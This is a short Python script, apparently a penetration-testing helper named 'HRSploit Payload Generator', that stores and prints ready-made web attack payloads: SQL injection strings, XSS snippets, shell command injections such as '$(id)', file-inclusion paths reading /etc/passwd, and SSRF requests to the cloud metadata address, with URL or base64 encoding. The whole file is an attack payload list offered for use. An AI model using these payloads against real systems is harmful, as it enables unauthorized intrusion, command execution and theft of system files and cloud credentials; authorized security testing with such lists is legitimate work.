#!/usr/bin/env python3
"""HRSploit Payload Generator"""
import sys,json,base64,time
from pathlib import Path
from datetime import datetime
from urllib.parse import quote

def log(t,m): print(f"[{datetime.now().strftime('%H:%M:%S')}][{t}] {m}",flush=True)

PAYLOADS = {
    "SQLi":["' OR '1'='1' --","1 AND SLEEP(3)--","' UNION SELECT user(),version()--","' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"],
    "XSS": ["<script>alert(1)</script>","<img src=x onerror=alert(1)>","<svg onload=alert(1)>"],
    "RCE": ["; id","| whoami","`id`","$(id)"],
    "LFI": ["../../../../etc/passwd","php://filter/convert.base64-encode/resource=/etc/passwd"],
    "SSRF":["http://127.0.0.1/","http://169.254.169.254/latest/meta-data/"],
}

def generate(vuln_type, encode=None):
    payloads = PAYLOADS.get(vuln_type, [])
    if encode == "url":   return [quote(p) for p in payloads]
    if encode == "b64":   return [base64.b64encode(p.encode()).decode() for p in payloads]
    return payloads

if __name__ == "__main__":
    vt = sys.argv[1] if len(sys.argv)>1 else input("Tur (SQLi/XSS/RCE/LFI/SSRF): ").strip()
    payloads = generate(vt)
    log("PAYLOAD", f"{len(payloads)} payload: {vt}")
    for p in payloads: print(f"  {p}")
    out = Path("payloads_custom"); out.mkdir(exist_ok=True)
    (out/f"{vt}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json").write_text(json.dumps(payloads,indent=2))
